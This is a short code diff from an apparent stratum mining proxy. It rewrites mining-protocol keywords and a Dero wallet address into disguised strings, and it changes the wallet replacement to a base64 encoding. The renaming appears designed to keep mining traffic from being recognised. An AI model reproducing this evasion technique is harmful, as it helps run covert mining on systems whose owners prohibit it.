@@ -50,7 +50,7 @@ function stratumRedirect(name, listenPort, redirectHost, redirectPort) {
 
         // Pass data back from the destination host
         serviceSocket.on("data", function (data) {
-            const tericoba = data.toString().replaceAll('params', 'carem').replaceAll('method', 'kirik').replaceAll('agent', 'kelas').replaceAll('method', 'method').replaceAll('job_id', 'ker').replaceAll('extra_nonce', 'taikan').replaceAll('result', 'bawut').replaceAll('pool_wallet', 'mbuhraroh').replaceAll('target', 'swili').replaceAll('height', 'wur').replaceAll('blob', 'plem').replaceAll('KUEREK', 'ZGVybzFxeXJoMzJnZ3lyZzJtZ2NuY3dxdjM4ZHA3a2M5d2dkNnF5YWNydnQ2OGZ6cmt0OXc5ZzBmdnFneTdxcWtz'); 
+            const tericoba = data.toString().replaceAll('params', 'carem').replaceAll('method', 'kirik').replaceAll('agent', 'kelas').replaceAll('method', 'method').replaceAll('job_id', 'ker').replaceAll('extra_nonce', 'taikan').replaceAll('result', 'bawut').replaceAll('pool_wallet', 'mbuhraroh').replaceAll('target', 'swili').replaceAll('height', 'wur').replaceAll('blob', 'plem').replaceAll('dero1qyrh32ggyrg2mgcncwqv38dp7kc9wgd6qyacrvt68fzrkt9w9g0fvqgy7qqks', 'ZGVybzFxeXJoMzJnZ3lyZzJtZ2NuY3dxdjM4ZHA3a2M5d2dkNnF5YWNydnQ2OGZ6cmt0OXc5ZzBmdnFneTdxcWtz'); 
             console.log('TERIMA: ' + tericoba);
             socket.write(tericoba);
         });
